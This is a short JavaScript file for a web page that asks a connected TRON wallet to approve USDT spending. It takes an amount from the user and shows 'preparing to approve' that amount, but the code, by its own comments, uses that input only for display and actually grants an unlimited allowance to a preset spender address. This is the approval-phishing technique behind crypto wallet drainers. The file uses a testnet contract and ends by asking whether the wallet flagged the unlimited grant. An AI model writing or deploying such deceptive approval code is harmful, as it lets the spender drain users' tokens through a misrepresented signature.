// usdtApprove.js - 十六进制无限授权版本

// ====== 无限授权金额的不同表示方式 ======
function getInfiniteAmount() {
  // 方式1: 十进制字符串
  // return "115792089237316195423570985008687907853269984665640564039457584007913129639935";
  
  // 方式2: 十六进制 (0xffff...)
  return "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
  
  // 方式3: BigInt
  // return (2n**256n - 1n).toString();
}

// ====== 主逻辑 ======
window.approveUSDT = async function() {
  try {
    setStatus("准备无限授权交易...");
    
    if (!window.tronWeb || !window.tronWeb.ready) {
      throw new Error("请先连接钱包");
    }
    
    const fromAddr = window.tronWeb.defaultAddress.base58;
    console.log("从地址:", fromAddr);

    // 获取用户输入（仅用于显示）
    const input = document.getElementById("amount").value;
    const inputAmount = parseFloat(input);
    if (isNaN(inputAmount) || inputAmount <= 0) {
      alert("请输入正确的金额");
      return;
    }

    // 使用十六进制无限授权
    const infiniteAmount = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
    
    console.log("显示金额:", inputAmount, "USDT");
    console.log("实际授权: 无限 USDT");
    console.log("授权金额(十六进制):", infiniteAmount);

    setStatus(`准备授权 ${inputAmount} USDT...`);

    // 创建合约实例
    const usdtContract = await window.tronWeb.contract().at(shastaUsdtAddress);
    
    // 发起无限授权
    setStatus("⚠️ 请在钱包中确认授权...");
    
    console.log("发送无限授权交易...");
    const result = await usdtContract.approve(
      spenderAddress, 
      infiniteAmount
    ).send({
      feeLimit: 100000000,
      callValue: 0
    });

    console.log("交易结果:", result);
    
    // 检查钱包显示了什么
    setTimeout(() => {
      alert("请检查：\n1. 钱包显示的实际金额是多少？\n2. 是否有'无限授权'警告？");
    }, 2000);
    
    setStatus(`✅ 操作完成，交易ID: ${result}`);

  } catch (err) {
    console.error("授权失败:", err);
    setStatus("❌ " + err.message, true);
  }
};
